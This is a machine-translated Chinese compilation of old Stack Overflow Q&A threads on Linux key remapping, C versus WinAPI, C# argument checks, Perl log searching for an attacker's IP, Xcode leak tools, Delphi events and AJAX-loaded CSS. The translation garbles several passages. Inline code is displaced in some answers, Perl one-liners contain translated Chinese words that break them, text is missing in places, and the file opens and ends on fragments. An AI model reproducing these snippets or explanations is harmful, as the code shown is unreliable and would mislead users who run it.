其中 w 将句柄公开给父窗口。

# linux - 使 Mac 快捷方式（例如 Cmd-C）在 linux 上工作

> ID：434083
> 
> 赞同：12
> 
> 时间：2009-01-12T00:08:55.450
> 
> 标签：linux, macos, keyboard-shortcuts

有没有办法在linux中将**`Cmd`+`C`**映射到复制？（而不是**`Ctrl`+`C`**）

**`Ctrl`如果我也可以拥有 emacs 样式的样式，例如+`B`**向左移动一个字符，那就太好了。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-04-16T13:18:16.287

> 在 Linux/X 上，有没有办法将某些键组合映射到其他键组合？

在所有开源项目的传统中，没有办法，*有**几个*. 在最低级别，您拥有内核键绑定，这可能不是您想要的。在 X 服务器级别，您拥有 xkb 及其无数实用程序。然后似乎每个窗口管理器——gnome、kde、xfce 或其他——也有一个键映射实用程序。xkb 似乎有很多实用程序等，并且可能比任何随机窗口管理器的键盘映射实用程序更完整，所以我先看看。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-31T06:04:41.670

KDE 3 可能是这里最灵活的；有一个名为“Mac Scheme”的预定义键盘快捷键方案。您可以通过 KControl 设置它，`Control Center > Regional & Accessibility > Keyboard Shortcuts`或者`kcmshell keys`它会立即对几乎所有 KDE 应用程序产生影响。您可能会错过一些 OS X 具有的类似 Emacs 的“Ctrl-*”快捷方式，但除此之外，它运行良好（只要您的 X 修饰符映射正确）。如果它不符合您的喜好，它很容易定制。

您还可以设置`Control Center > Desktop > Behavior`启用类似 Mac OS 的菜单栏；所有 KDE 应用程序将在屏幕顶部共享一个菜单栏，而不是单独附加到每个窗口。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2019-08-06T20:02:10.573

**2020 年 2 月 3 日更新**

Kinto 现在已经用 C 语言重写，用于使用 x11 的 Ubuntu/Debian 系统。它还使用 json 配置文件，使其更易于管理和扩展到其他应用程序，而不仅仅是终端。该应用程序不再映射到终端应用程序中的 Super，它现在将正确地映射到 Ctrl+Shift 以创建与使用 Cmd 键完全相同的感觉。

请查看最新版本。 [https://github.com/rbreaves/kinto](https://github.com/rbreaves/kinto)

允许 Super = Ctrl+Shift 更改的主要更改在此符号文件中。

```
default partial xkb_symbols "mac_levelssym" {
    key <LWIN> {
      repeat= no,
      type= "ONE_LEVEL",
      symbols[Group1]= [ Hyper_L ],
      actions[group1]=[ SetMods(modifiers=Shift+Control) ]
    };
    key <RWIN> {
      repeat= no,
      type= "ONE_LEVEL",
      symbols[Group1]= [ Hyper_R ],
      actions[group1]=[ SetMods(modifiers=Shift+Control) ]
    };
}; 
```

* * *

Pjz 的回答是正确的，说 xkb 解决方案是理想的，可悲的是很少有人走这条路，很可能是由于学习 xkb 的困难，而且似乎很多人已经走上了使用 Xmodmap 文件的路线，而我们正在使用这些文件已被弃用我们去韦兰的路。

这个答案可能为时已晚几年，但这是任何方法。

Kinto 是我最近创建的一个工具，它将解决这个问题，它通过使用 xkb 并通过监听您当前使用的应用程序来解决这个问题，因为它还在使用终端时更改了键盘映射，因此类似 mac 的体验可以保持一致。

[https://github.com/rbreaves/kinto](https://github.com/rbreaves/kinto)

[https://medium.com/@benreaves/kinto-a-mac-inspired-keyboard-mapping-for-linux-58f731817c0](https://medium.com/@benreaves/kinto-a-mac-inspired-keyboard-mapping-for-linux-58f731817c0)

这也是一个要点，如果你只是想看看这一切的核心是什么，它不会在需要时改变你的键盘映射。Gist 也不包括自定义 xkb 键盘映射文件，这些文件设置 macOS 样式光标/使用 Cmd 和箭头键的逐字操作。

[https://gist.github.com/rbreaves/f4cf8a991eaeea893999964f5e83eebb](https://gist.github.com/rbreaves/f4cf8a991eaeea893999964f5e83eebb)

编辑：也发布要点的内容。我无法实际发布 Kinto 的内容。

```
# permanent apple keyboard keyswap
echo "options hid_apple swap_opt_cmd=1" | sudo tee -a /etc/modprobe.d/hid_apple.conf
update-initramfs -u -k all

# Temporary & instant apple keyboard keyswap
echo '1' | sudo tee -a /sys/module/hid_apple/parameters/swap_opt_cmd

# Windows and Mac keyboards - GUI (Physical Alt is Ctrl, Physical Super is Alt, Physical Ctrl is Super)
setxkbmap -option;setxkbmap -option altwin:ctrl_alt_win

# Windows and Mac keyboards - Terminal Apps (Physical Alt is Super, Physical Super is Alt, Physical Ctrl is Ctrl)
setxkbmap -option;setxkbmap -option altwin:swap_alt_win

#
# If you want a systemd service and bash script to help toggle between
# GUI and Terminal applications then look at project Kinto.
# https://github.com/rbreaves/kinto
#
# Note: The above may not work for Chromebooks running Linux, please look
# at project Kinto for that.
#
# If anyone would like to contribute to the project then please do!
# 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T01:10:24.577

如果您切换 Cmd 和 Ctrl，您几乎可以到达那里

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2009-04-16T13:27:21.477

xmodmap -e "keycode 63 = Control_L"

这样 Cmd 将成为控制。不会交换其他密钥

编辑：我忘记了“-e”

# c++ - C 库与 WinApi

> ID：434085
> 
> 赞同：13
> 
> 时间：2009-01-12T00:09:28.693
> 
> 标签：c++, c, winapi, visual-c++

许多标准 c 库（fwrite、memset、malloc）函数在 Windows Api 中有直接等效函数（WriteFile、FillMemory/ ZeroMemory、GlobalAlloc）。

除了可移植性问题，应该使用什么，CLIB 或 Windows API 函数？

C 函数会调用 Windows Api 函数还是相反？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-01-12T00:14:47.980

C 库没有什么神奇之处。它只是一个用于从操作系统访问公共服务的标准化 API。这意味着它是在操作系统之上实现的，使用操作系统提供的 API。

在您的情况下使用任何有意义的方法。C 库是可移植的，Win32 不是。另一方面，Win32 通常更灵活，并提供更多功能。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-12T00:15:18.073

除了诸如 ZeroMemory 之类的一些简单功能之外，这些功能并不是真正等效的。

例如 GlobalAlloc 为您提供内存，但它也用于 win16 下的共享内存传输。此功能的一部分仍然存在。

WriteFile 不仅会写入文件，还会写入（以及其他）命名管道。fwrite 或 write 不能直接做的事情。

如果可能，我会说使用 c 库函数，并且仅在您需要额外功能或获得性能改进时才使用 windows 函数。

这将使以后更容易移植到其他平台。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-12T02:40:24.367

它可能比您正在寻找的信息更多（并且可能不完全是您所要求的），但 Catch22.net 有一篇题为“[减少可执行文件大小的技术](http://catch22.net/tuts/minexe)”的文章可能有助于指出 Win32 api 调用和 c 运行时调用的差异。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-01-12T00:20:12.447

> C函数会调用winapi函数还是相反？

C 函数（在用户模式库中实现）调用 WINAPI 函数（在 O/S 内核中实现）。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-01-12T01:54:04.693

如果您要跨多个平台移植您的应用程序，我会说您应该创建自己的一组包装器，即使您使用标准 C 函数。这将在切换平台时为您提供最佳的灵活性，因为您的代码将以更好的方式与底层系统隔离。

当然，这意味着如果你只打算为 Windows 平台编程，那就只使用 Windows 函数，不要使用相同类型的标准 C 库函数。

最后，你只需要与你的选择保持一致，你会没事的。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-12T00:17:11.173

C 函数将调用系统 API，标准运行时 C 库（或 CRT）是用于在系统之间进行标准化的 API。

在内部，每个系统都直接使用系统调用或驱动程序设计自己的 API。如果你有 Visual C++ 的商业版本，它用来提供 CRT 源代码，这很有趣。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-01-12T01:36:12.047

关于一些例子的几点补充：

> 填充内存，零内存

这些和 C 函数都不是系统调用，因此任何一个都可能在另一个之上实现，或者它们甚至可以具有不同的实现，来自或不来自公共源。

> 全局分配

由于 malloc() 建立在其 API 公开的操作系统原语之上，因此了解 malloc() 和直接使用此类分配器是否可以愉快地共存而不会出现问题将会很有趣。我可能会想到一些原因，为什么 malloc 可能会默默地假设它访问的堆是连续的，即使我会称其为设计错误，即使它已记录在案，除非额外的安全成本不是微不足道的。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2016-11-10T21:38:15.643

好吧，我目前正在尝试避免包含 fstream、sstream、iostream 和许多 C 标准库文件，而是使用 winAPI，因为包含这些库中的任何一个都会将输出可执行文件的大小从大约 10 KB 增加到大约 500 KB。但有时最好使用 C 标准库来使您的代码跨平台。所以我认为这取决于你的目标。

# c#-4.0 - 按合同设计/C# 4.0/避免 ArgumentNullException

> ID：434088
> 
> 赞同：6
> 
> 时间：2009-01-12T00:14:06.377
> 
> 标签：c#-4.0, argumentnullexception

我非常厌倦检查我所有的参数是否为 null，并在它们出现时抛出 ArgumenutNullExceptions。

据我了解，C# 4.0 支持按合同构造进行一些设计。在 C# 4.0 中是否可以指定方法不接受空参数？

另外，在此期间我能做些什么（也许是一个属性？）来避免检查 null 和抛出这种单调的任务？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T00:30:40.290

您可以创建一个`NotNull<T>`有帮助的泛型类，但有一些副作用。请参阅[Robert Nystrom 的博文](http://journal.stuffwithstuff.com/2008/04/08/whats-the-opposite-of-nullable/)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-21T12:10:12.343

Rick Brewster 在这篇文章中描述了一个简洁的声明式参数检查的好解决方案，

[http://blog.getpaint.net/2008/12/06/a-fluent-approach-to-c-parameter-validation/](http://blog.getpaint.net/2008/12/06/a-fluent-approach-to-c-parameter-validation/)

避免使用反射（DbC 的缺点）并且不会为非异常代码路径创建开销。

Like how he uses extension methods to allow what appears to be instance method calls on null objects. Very clever bit of coding IMO.

If you are sold on DbC, Google Spec# and PostSharp.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-12T00:50:24.353

不确定 C# 4.0 中的原生 DbC 构造，但微软将发布跨语言[合同](http://research.microsoft.com/en-us/projects/contracts/)库。[您可以在此处](http://research.microsoft.com/research/downloads/details/4ed7dd5f-490b-489e-8ca8-109324279968/details.aspx)
下载 MSVS2008 的版本。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T05:53:45.550

**作为已经给出的答案的替代方案，值得研究[`Null Object design pattern`.](http://www.cs.oberlin.edu/~jwalker/nullObjPattern/)**

这种设计模式的本质是，一旦创建了“null 对象”，就不需要再对 null 执行任何检查，并且 null 对象的方法实现了无论何时传递 null（否则）所需的行为 vs对“真实对象”的引用。

**这种设计模式不依赖于 C# 4.0，实际上几乎可以用任何 OO 编程语言轻松实现**。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-07-11T00:20:04.720

I have just started using Code Contracts its a new feature in C# 4.0 you need to download an addin from MS to allow you to see it in your project settings. Details here -> [http://research.microsoft.com/en-us/projects/contracts/](http://research.microsoft.com/en-us/projects/contracts/)

# multithreading - 如何在 OS X 的 Bigloo 方案中启用本机线程支持？

> ID：434089
> 
> 赞同：6
> 
> 时间：2009-01-12T00:14:37.497
> 
> 标签：multithreading, configuration, scheme, bigloo

我正在尝试`Bigloo`从源代码编译Scheme，但我无法弄清楚如何通过`./configure`OS X 10.5（Leopard）启用本机线程支持（而且我还没有读到线程不应该在这个平台上工作的任何地方）。

我运行`./configure --enable-sqlite --enable-web --enable-ssl --enable-pthreads --enable-fthreads`，但是在配置摘要中，我总是得到：

```
Release features:
  release number........................ 3.2a
  supported backends.................... native:yes JVM:no .NET:no
  default backend....................... native
  additional APIs....................... fthreads pthreads ssl web sqlite ssl sqlite web multimedia mail calendar pkgcomp pkglib
  native threads support................ no
  openssl support....................... yes (dtls no)
  sqlite support........................ sqltiny + sqlite
  dynamic libraries support............. yes
  bee support........................... partial 
```

我想`Bigloo`使用`Hop`，当我尝试使用如此创建的二进制文件运行它时，我总是收到警告：

```
*** WARNING:bigloo:hop
Threads disabled, forcing "nothread" scheduler. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-08-25T08:47:55.700

配置脚本有一个名为“--os-macosx”的开关，尝试使用它。最后一个例子是访问[https://github.com/manuel-serrano/bigloo](https://github.com/manuel-serrano/bigloo)并提出问题。Bigloo 正在积极开发中，因为最后一个版本是从 2020 年 5 月开始的。

# perl - 如何扫描多个日志文件以查找其中具有特定 IP 地址的日志文件？

> ID：434098
> 
> 赞同：1
> 
> 时间：2009-01-12T00:18:04.510
> 
> 标签：perl, search, file, grep

最近有一些攻击者在我的服务器上尝试恶意行为，所以我决定在某种程度上“跟踪”他们，即使我知道他们不会走得太远。

现在，我有一个包含服务器日志的完整目录，我需要一种方法来搜索目录中的每个文件，如果找到字符串则返回文件名。所以我心想，有什么比 Perl 更适合用于文本和文件操作的语言呢？所以我的朋友正在帮助我编写一个脚本来扫描某个 IP 的所有文件，并返回包含该 IP 的文件名，这样我就不必手动通过每个日志搜索攻击者。（我有数百个）

```
#!/usr/bin/perl

$dir = ".";

opendir(DIR, "$dir");
@files = grep(/\.*$/,readdir(DIR));
closedir(DIR);

foreach $file(@files) {
    open FILE, "$file" or die "Unable to open files";

    while(<FILE>) {
        print if /12.211.23.200/;
    }

} 
```

虽然它给了我目录读取错误。非常感谢任何帮助。

编辑：代码已编辑，仍然在第 10 行说权限被拒绝无法打开目录。如果您质疑目录更改为“。”，我将在日志目录中运行脚本。

麦克风。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-01-12T00:23:22.347

你可以用[grep](http://en.wikipedia.org/wiki/Grep)代替吗？

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-12T10:50:31.567

要获取 IP 的所有行，我会直接使用**grep**，无需显示文件列表，这是一个简单的命令：

```
grep 12\.211\.23\.200 *
```

我喜欢将它传送到另一个文件，然后在编辑器中打开该文件......

如果你坚持想要文件名，这也很容易

```
grep -l 12\.211\.23\.200 *
```

grep 在所有带有 GNU 工具的 Unix//Linux 上可用，或者在使用许多实现之一（unxutils、cygwin 等）的 Windows 上可用。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-12T00:25:07.057

使用通过 找到的文件时 ，您必须`$dirname`与连接，记住您还没有进入这些文件所在的目录。`$filname``readdir``chdir`

```
open FH, "<", "$dirname/$filname" or die "Cannot open $filname:$!"; 
```

顺便说一句，为什么不使用`grep -r`递归搜索日志目录下的所有子目录来查找字符串？

**编辑：**我看到你的编辑，还有两件事。首先，这一行：

```
@files = grep(/\.*$/,readdir(DIR)); 
```

无效，因为您`.`在字符串末尾搜索零个或多个字符。由于它是零个或多个，它将​​匹配目录中的所有内容。如果您尝试排除以 结尾的文件`.`，请尝试以下操作：

```
@files = grep(!/\.$/,readdir(DIR)); 
```

`!`如果您尝试排除这些文件，请注意否定符号。否则（如果您只想要这些文件并且我误解了您的意图），请忽略`!`。

在任何情况下，如果您`die`在第 10 行收到消息，则很可能您遇到的文件具有无法读取的权限。尝试将文件名放在 die 输出中，这样您就可以看到哪个文件失败了：

```
open FILE, "$file" or die "Unable to open file: $file"; 
```

但与其他答案一样，重申：**为什么不使用 grep？** unix 命令，而不是 Perl 函数。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-12T00:22:39.103

这将获得您在 perl 中查找的文件名，并且可能比运行和执行 perl 正则表达式要快得多。

```
@files = `find ~/ServerLogs -name "*.log" | xargs grep -l "<ip address>"`' 
```

虽然，这需要一个兼容 *nix 的系统，或者 Windows 上的 Cygwin。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-12T00:22:58.027

首先获取源目录中的文件列表：

```
opendir(DIR, "$dir");
@files = grep(/\.log$/,readdir(DIR));
closedir(DIR); 
```

然后遍历这些文件

```
foreach $file(@files)
{
  // file processing code
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-12T00:28:06.830

我的第一个建议是使用 grep 代替。他们说，适合这项工作的工具……

但要回答你的问题：

readdir 只返回目录中的文件名。您需要将目录名和文件名连接在一起。

```
$path = "$dirname/$filname";
open FH, $path or die ... 
```

然后您应该忽略实际上是目录的文件，例如“。” 和 ”..”。得到 $path 后，检查它是否是一个文件。

```
if (-f $path) {
    open FH, $path or die ...
    while (<FH>) 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-01-12T12:47:40.910

顺便说一句，我想我会提到 File::Next。遍历目录中的所有文件（递归）：

```
use Path::Class; # always useful.
use File::Next;

my $files = File::Next::files( dir(qw/path to files/) ); # look in path/to/files
while( defined ( my $file = $files->() ) ){
    $file = file( $file );
    say "Examining $file";
    say "found foo" if $file->slurp =~ /foo/;
} 
```

File::Next 是安全的。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-03-20T19:41:52.307

我知道我在这个讨论中已经很晚了（在搜索 grep 相关帖子时遇到了它），但无论如何我都会回答：

如果这些是 Web 服务器日志（Apache、IIS、W3SVC 等）并没有明确说明，但挖掘这些数据以获取数据的最佳工具是 Microsoft 的 LogParser 工具。有关更多信息，请参阅 logparser.com。

LogParser 将允许您针对日志文件编写类似 SQL 的语句。它非常灵活且非常快速。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-01-12T00:33:33.107

~ 在 Perl 中不会自动扩展。

```
opendir my $fh,  '~/' or die("Doin It Wrong");  # Doing It Wrong. 

opendir my $fh, glob('~/') and die( "Thats right!" ); 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-01-12T00:42:31.123

此外，如果*必须*使用`readdir()`，请确保保护表达式：

```
while (defined(my $filename = readdir(DH))) {
    ...
} 
```

如果您不进行`defined()`测试，如果找到名为“0”的文件，循环将终止。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-01-12T01:07:59.980

您是否在[CPAN](http://search.cpan.org/)上查看过日志解析器？我用“log parse”搜索，结果超过 200 次。有些（可能很多）不相关——有些可能是相关的。这部分取决于您使用的 Web 服务器。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-01-12T01:17:47.840

我读对了吗？给你错误的第 10 行是

```
open FILE, "$file" or die "Unable to open files"; 
```

根据第 6 行，您尝试读取的 $file，

```
@files = grep(/\.*$/,readdir(DIR)); 
```

**是以零个或多个点结尾**的文件。这是你真正想要的吗？这基本上匹配目录中的每个文件，包括“。” 和 ”..”。也许您没有足够的权限打开父目录进行阅读？

编辑：如果您只想读取所有文件（包括隐藏文件），您可能需要使用以下内容：

```
opendir(DIR, ".");
@files = readdir(DIR);
closedir(DIR);

foreach $file (@files) {
  if ($file ne "." and $file ne "..") {
    open FILE, "$file" or die "cannot open $file\n";
    # do stuff with FILE
  }
} 
```

请注意，这不涉及子目录。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2013-02-13T15:22:07.570

从命令行使用 perl，就像更好的 grep

# perl -wnl -e '/12.211.23.200/ 并打印；' *.log > 输出.txt

这里的好处是你可以更容易地链接逻辑

# perl -wnl -e '(/12.211.23.20[1-11]/ 或 /denied/i ) 并打印；' *。日志

如果您觉得古怪，您还可以使用更高级的命令行选项将 perl one liner 结果提供给其他 perl one liner。

你真的需要阅读“Minimal Perl: For UNIX and Linux People”，这本书非常棒。

* * *

## 回答 #14

> 赞同：-1
> 
> 时间：2009-01-12T08:58:56.050

首先，使用`grep`.

但是，如果您不想这样做，您可以进行两项我尚未提及的小改进：

1) 改变：

```
@files = grep(/\.*$/,readdir(DIR)); 
```

至

```
@files = grep({ !-d "$dir/$_" } readdir(DIR)); 
```

这样，您将不仅排除“。” 和“..”以及服务器日志目录中可能存在的任何其他子目录（`open`否则下游会阻塞）。

2) 改变：

```
print if /12.211.23.200/; 
```

至

```
print if /12\.211\.23\.200/; 
```

" `.`" 是一个正则表达式通配符，意思是“任何字符”。将其更改为 " `\.`" 将减少误报的数量（在实践中不太可能改变您的结果，但无论如何它更正确）。

# c++ - Mac OSX - Xcode/泄漏问题

> ID：434099
> 
> 赞同：4
> 
> 时间：2009-01-12T00:18:34.353
> 
> 标签：c++, xcode, macos

我是使用 Xcode 进行开发的新手，并且无法使用内置的 Leaks Instrument。

我已启用保护 malloc 并将 MallocStackLogging YES 和 MallocStackLoggingNoCompact YES 放入可执行文件的环境变量中。然后通过单击运行该过程

运行->从性能工具开始->泄漏

但只有对象分配显示在 UI 中，在泄漏框架中，它所说的只是“分析过程”（我已经像这样离开了 20 多分钟，没有任何变化）

我故意在 main() 中创建了一个泄漏

```
void * leak = malloc(100);
    leak=NULL; 
```

但没有变化

如果我从控制台运行

```
 ~$ leaks ProcessName 
```

它正确报告

```
Process 1014: 223344 nodes malloced for 9017 KB
Process 1014: 1 leak for 112 total leaked bytes.
Leak: 0x100100020  size=112 string ''
    Call stack: [thread 0x7fff70767720]: | start | main | malloc | malloc_zone_malloc 
```

但有谁知道为什么 UI 不会显示相同的东西？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T01:16:29.370

问题似乎是将应用程序编译为 64 位。一个简单的测试 Xcode 项目

```
#include <iostream>

void leaks(){

    char * newleak = (char* ) malloc(2000);

    return;
}

int main (int argc, char * const argv[]) {

    void * leak = malloc(100);
    leak = NULL;

    while(1){
        leaks();
        sleep(10);  
    }

} 
```

如果架构是 i386，泄漏将正确显示，但是如果我编译为 x86_64（需要 64 位数学），它将挂在“分析过程”上。我在这里做错了什么吗？我正在使用 Intel Core 2 Duo macbook pro

# c# - 创建 C# winform 简单动态控件

> ID：434108
> 
> 赞同：0
> 
> 时间：2009-01-12T00:25:02.860
> 
> 标签：c#, winforms

```
 private void CreateNewControl()
        {
            List<Control> list = new List<Control>();
            TableLayoutPanel layout = new TableLayoutPanel();
            layout.Dock = DockStyle.Fill;
            this.Controls.Add(layout);
            layout.ColumnCount = 3;
            layout.GrowStyle = TableLayoutPanelGrowStyle.AddRows;

            for (int i = 0; i < 9; i++)
            {

                if (wantedType == DevExpress.XtraEditors.CheckEdit)
                {

                    CheckBox chk = new CheckBox();
                    chk.Tag = i;

                    layout.Controls.Add(chk);
                    layout.AutoScroll = true;

                }

                if (wantedType ==  LabelControl)
                {
                    Label chk = new Label();

                    chk.Tag = i;

                    layout.Controls.Add(chk);
                    layout.AutoScroll = true;

                } 
```

// 我想设置布局的列宽，以便在显示标签时它们不会聚集并且看起来与显示复选框时完全一样。我该怎么做？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T00:30:56.373

一般来说，我所做的是：

*   在“原型”项目中使用 IDE，在我想要的位置创建一个带有控件的表单
*   查看 IDE 创建的源代码（在*MyFormName*`.Designer.cs`文件中），看看 IDE 生成了哪些源代码来创建这些控件
*   在我的真实项目中创建我自己的表单，使用基于我从使用 IDE 创建的原型中学到的手工编码代码

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-15T07:27:55.300

```
// Loop through all the controls you want to add.
// Add a integer field that measures the highest width of each control like

int _iMaxWidth = 0;

for (int i=0; i < TotalControls.Count; ++i)
{
   if ( control[i].Width > _iMaxWidth)
      _iMaxWidth = control[i].Width
}

// Then you'll know what the width size of the column should be.
Col.Width = iMaxWidth + 2; // +2 to make things a little nicer. 
```

# c++ - 我应该使用什么 SDK？C++

> ID：434121
> 
> 赞同：3
> 
> 时间：2009-01-12T00:37:49.107
> 
> 标签：c++, sdk

我想到了这个程序，我想尝试用 C++ 创建。我不确定我应该使用什么 SDK，这是这个想法：

基本上就像 Facebooks status' 或 twitter 但仅限于您的桌面。像 AIM 或 MSN 这样的窗口可以让您查看您的朋友及其当前状态，允许您对其发表评论等。当有人更改他们的状态时，他们所有的朋友都会在他们的屏幕右下角收到一个小通知，说明他们的朋友目前的状态是。显然会有更多的东西使它与众不同，但这是我开始的基本想法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T06:27:13.800

如果您打算将其作为开源版本发布，[Qt GUI 框架](http://trolltech.com)非常值得考虑（您也可以购买商业许可证）。它是跨平台的 (Linux/Win/Mac) - 例如。谷歌地图桌面应用程序使用它。

它将为您提供网络支持、HTML/XML 渲染（如有必要）、SQL 等等。

至于通信协议，请遵循 Greg 的建议。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T00:55:24.187

跨平台 GUI 系统的一个不错的选择是[wxWidgets](http://wxwidgets.org)。对于用户之间的通信，像[XMPP](http://xmpp.org)这样的东西将是一个不错的选择，因为它是一个与平台无关的开放标准，对用户“存在”提供了坚实的支持。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T09:19:59.817

Qt 是一个很好的跨平台工具包。看看那个。

# delphi - 在 Delphi 2007 中设置事件处理程序并出现“参数列表不同”错误

> ID：434126
> 
> 赞同：2
> 
> 时间：2009-01-12T00:43:44.787
> 
> 标签：delphi, event-handling, delphi-2007

我正在尝试在**Delphi 2007**中编写一个使用**ActiveX**库的类。该类将捕获 ActiveX 库必须公开其自己的事件的事件，该事件将一些信息添加到 ActiveX 库的事件中。

底线是，当我将自己的过程分配给要使用的 ActiveX 库的事件时，会出现错误：

```
E2009 Incompatible types: 'Parameter lists differ' 
```

我确定参数列表是相同的（相同数量的参数和相同的类型），所以我认为我的做法是错误的。

任何建议或有人可以发布一些我正在尝试做的示例代码吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-12T01:15:36.657

首先要检查的是您尝试分配给事件属性的东西是*方法*。它需要是属于某个类的过程或函数；它不能是一个独立的子程序。

接下来，请注意仅确认类型*名称*匹配是不够的。Delphi 允许重新定义标识符，因此当您在另一个单元中看到相同的标识符时，您在一个单元中看到的类型名称不一定指的是同一事物。意思甚至可以在一个单元的中间发生变化。例如：

```
unit Example;

interface

uses Windows;

var
  foo: TBitmap;

implementation

uses Graphics;

var
  bar: TBitmap;

end. 
```

`foo`变量有 type `Windows.TBitmap`，一个记录类型，而有`bar`type `Graphics.TBitmap`，一个类类型。

您可以让 IDE 帮助您诊断此问题：Ctrl+单击标识符名称，让 IDE 带您进入它们的声明。他们会带你去同一个地方吗？如果没有，那么您可以使用单位名称限定类型名称。例如，我们可以将`bar`上面的声明更改为：

```
var
  bar: Windows.TBitmap; 
```

现在它将具有与 相同的类型`foo`。在您的事件处理程序声明中检查相同类型的内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T12:37:24.567

我在 Ctrl+click 中使用了 gabr 的建议，发现其中一个参数是一个我没有意识到的常数。我将第二个变量更改为 const 并且效果很好。谢谢。

# javascript - CSS 从通过 Javascript 嵌入到 Div 的内容中剥离

> ID：434127
> 
> 赞同：0
> 
> 时间：2009-01-12T00:44:02.680
> 
> 标签：javascript, css, ajax, prototypejs

我有以下文件文件：

```
<html>
<head>
<title></title>

<script type="text/javascript" src="/Prototype.js"></script>
<script type="text/javascript">
function load_content()
{
  new Ajax.PeriodicalUpdater('content', '/UpdatedContent/,
  {
    method: 'post',
    frequency: 5
  });

  //var fileref = document.createElement("link");
  //fileref.setAttribute("rel", "stylesheet");
  //fileref.setAttribute("type", "text/css");
  //fileref.setAttribute("href", filename);
}
</script>

</head>

<body>

<div id="content"></div>

<script type="text/javascript">
    load_content();
</script>

</body>
</html> 
```

UpdatedContent 中的内容应该每 5 秒加载到“内容”div 中。奇怪的是，HTML 已加载，但加载页面顶部的部分在插入“内容”时被完全删除

加载的页面本质上是这样的：

```
<style type="text/css"> 
 ... lots of css here ...
</style>

... lots of HTML here ... 
```

没有, ,

CSS不能直接注入div吗？原型框架或浏览器的 DOM 是否有某种原因剥离了 CSS？

如何在不单独调用的情况下包含 CSS？

从给定的主文件中可以看出，页面将完全空白，“内容” div 中没有任何内容。这是故意的。我基本上想将其用作一个结构，在该结构上动态加载更新内容，这样页面就不必完全重新加载来刷新数据。

不，我不能只是将 CSS 硬编码到上述文件中，因为 CSS 也会发生变化。

**编辑：**关于[yaauie 的回应](https://stackoverflow.com/questions/434127/css-stripped-from-content-embeded-via-javascript-into-div#434180)……现在我知道为什么会这样了，因为我将风格和内容放在一起传递。如果我将 CSS 分离到一个可以加载的单独文件中，我将如何通过 AJAX（最好使用 Prototype）加载它，然后更重要的是，将该 CSS 设置为页面内容的样式表？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-12T01:19:52.750

该`<style>`标签只允许在`<head>`HTML[和](http://www.w3.org/TR/REC-html40/present/styles.html#h-14.2.3)XHTML[中](http://www.w3.org/TR/2005/WD-xhtml2-20050527/mod-styleSheet.html)使用，而不是在其`<body>`或其任何后代中。Web 浏览器在文档的初始解析中往往对此相当宽容，但是在更改 innerHTML 时，我希望浏览器会忽略任何`<style>`元素，因为那里不希望出现那种类型的元素。

作为一种解决方法，是否可以在您的响应中使用内联 CSS，即使用`style=""`您传递的 HTML 元素的属性？

**编辑：**要将 CSS 添加到`<head>`将需要两件事之一：

*   两次往返您的服务器：
*   包含两者并且可以在插入之前进行解析的响应

在这种情况下，我建议在发送之前将您的两个部分编码为 JSON 对象。您对 AJAX 操作的回调应该拆分这些并将它们附加到它们的适当位置（样式优先以避免屏幕抖动）

```
{"style":"\ndiv#ajax7373 a {\n  color:#fff;\n  text-decoration:underline;\n  font-weight:bold;\n  \n}\ndiv#ajax7373 {\n  background-color:#ff1cae;\n  color:#ff6ccf;\n}","object":"\n<div id=\"#ajax7373\">\n\tThere is the contents of your div and a <a href=\"#\">link<\/a>\n<\/div>\n"} 
```

也就是说，我很难相信该应用程序如此强烈地支持样式/内容分离，并且正在采用一种样式必须由内容生成的方法。为什么不对整个域设置样式，包括 AJAX 请求的预期返回？AJAX 请求的项目真的会在结构/样式上有足够的差异来保证这一点吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-13T14:54:10.983

您要么被生成的 CSS 的内联样式所困扰，要么您必须为所需的所有各种样式编写大量的类名，以便您仍然可以分离出样式。然后你可以通过 JS 更改类名。

# neural-network - 如何在神经网络中找到神经元的值

> ID：434128
> 
> 赞同：1
> 
> 时间：2009-01-12T00:44:19.887
> 
> 标签：neural-network, pseudocode

